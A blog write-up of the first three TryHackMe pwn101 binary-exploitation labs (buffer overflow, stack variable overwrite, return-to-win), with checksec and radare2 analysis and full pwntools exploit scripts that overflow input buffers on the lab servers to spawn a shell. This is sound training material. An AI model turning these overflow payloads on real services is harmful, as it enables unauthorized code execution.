---
title: "Binary Exploitation"
date:  2023-011-08 15:04:23
categories: [Reverse Engeering]
tags: [Reverse Engeering]
---

**Pwn101 Tryhackme**

This is about binary exploitation and reverse engineering on a tryhackme machine pwn101. There are 10 labs for 10 different kinds of binary vulnerabilities.

- Buffer overflow
- Modify the variable's value
- Return to win
- Return to shellcode
- Integer Overflow
- Format string exploit
- Bypassing mitigations
- GOT overwrite
- Return to PLT
- Playing with ROP

**pwn101**

So let's start with pwn 101 it has a downloadable file pwn101.pwn101, And it is about buffer overflow.
First `checksec` a binary to see what mitigations is provided with it,

![pwn101](https://prabinsigdel.com.np/images/pwn101_1.jpg)

You can see there is no any stack canary available to protect from buffer overflowÂ ,so run the binary and provide a large no of inputs other than it expected. If you don't know what stack canary is [click here](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/).

![pwn101](https://prabinsigdel.com.np/images/pwn101_2.jpg)

![pwn101](https://prabinsigdel.com.np/images/pwn101_3.jpg)

OK we successfully overflowed the binary function gets which is vulnerable to buffer overflow and jump to `/bin/sh`. So to get flag we have to test on remote server.The exploit written in python with help of pwntools.

You can check others exploits on my github repo [here](https://github.com/0xpr4bin/pwn101).

```
#!/usr/bin/env python3

from pwn import *
binary=context.binary=ELF("./pwn101.pwn101")
context.log_level="critical"
payload=b"A"* 0x40 + b"A"*0x4 + b"B"*0x8
p=remote("10.10.86.157",9001)
#p=process()
p.sendline(payload)
p.recv()
p.interactive()
```

Run the python script `./exploit101.py` and we got the flag on the remote server.

![pwn101](https://prabinsigdel.com.np/images/pwn101_4.jpg)

**pwn102**

Ok as usual lets start with the checksec using command.

`checksec -file=pwn102.pwn102`

![pwn102](https://prabinsigdel.com.np/images/pwn102_1.jpg)

Also there is no stack canary present, and it is vulnerable to buffer overflow
Lets debug this binary on radare2,

`r2 -d -A pwn102.pwn102`

![pwn102](https://prabinsigdel.com.np/images/pwn102_2.jpg)

The `scanf` function is taking values in `@rbp-0x70` without any size validation so we can overflow the buffer but we need to modify two variables `@rbp-0x4` and `@rbp-0x8` with`0xc0d3`and `0xc0ff33` respectively because these are set on the stack above buff4r.

![pwn102](https://prabinsigdel.com.np/images/pwn102_3.jpg)

After that we can get to call `/bin/sh` and spawn a shell.

![pwn102](https://prabinsigdel.com.np/images/pwn102_4.jpg)

Lets write a script to execute on remote server on port 9002.

```
#!/usr/bin/env python3

from pwn import *
context.binary=binary=ELF("./pwn102.pwn102")
context.log_level="critical"
payload = b"A"*104
payload+= p32(0xc0d3)
payload+= p32(0xc0ff33)
#p=process()
p=remote("10.10.103.79",9002)
p.sendline(payload)
p.interactive()
```

Finally we got the flag

![pwn102](https://prabinsigdel.com.np/images/pwn102_5.jpg)

**pwn103**

Ok This is about `re2win`, it is basically overwriting the instruction pointer to return to the desired function.
lets start with `checksec`.

![pwn103](https://prabinsigdel.com.np/images/pwn103_1.jpg)

There is no stack canary and PIE is disabled, meaning we can overflow the buffer and the address of the function won't change between execution `(PIE disabled)`.

lets run the binary first and see.

`./pwn103.pwn103`

![pwn103](https://prabinsigdel.com.np/images/pwn103_2.jpg)

It's asking for options and case 3 is vulnerable to buffer overflow, we can send as many bytes we want because it is using `scanf()` function that is not checking buffer size limitations as you can see below.

![pwn103](https://prabinsigdel.com.np/images/pwn103_3.jpg)

So as mentioned earlier `PIE` is disabled so address won't change on execution.We can get win() function and this time it is admins_only() which will spawn a /bin/sh shell. So we will get admins_only address `(sym.admins_only)` and overwrite the `RIP` to return the `general()` function to
 `admins_only()`.

 ![pwn103](https://prabinsigdel.com.np/images/pwn103_4.jpg)

 Lets write a script to get the flag on remote server on port 9003.

 ```
 #!/usr/bin/env python3

from pwn import *
context.binary=binary=ELF("./pwn103.pwn103")
context.log_level="critical"

#p=process()
p=remote("10.10.114.45",9003)

#get the win() function address
admins_only=p64(binary.symbols.admins_only)

#To overcome stack alignement we have to put ret gadgets
ret_address=p64(0x00401377)

#We overwrite the buffer as well as 0x20 bytes until reach rbp and overwrite rip with win() adress
payload=b"A"*0x20 + b"B"*0x8 + ret_address + admins_only
#To choose vulnerable option

p.sendline(b"3")
p.sendline(payload)
p.interactive()
 ```

 In the above exploit we are first sending `b"3"` bytes to choose option general, then sending bytes of `0x20` to overwrite the buffer until we reach to the RBP and `0x8` bytes to overwrite RBP itself and `ret_address` for stack alignement as well as admins_only adress to overwrite the RIP to call win() function `(admins_only)`.

 Run the script and get the flag.

 `Ppython exploit103.py`


![pwn103](https://prabinsigdel.com.np/images/pwn103_5.jpg)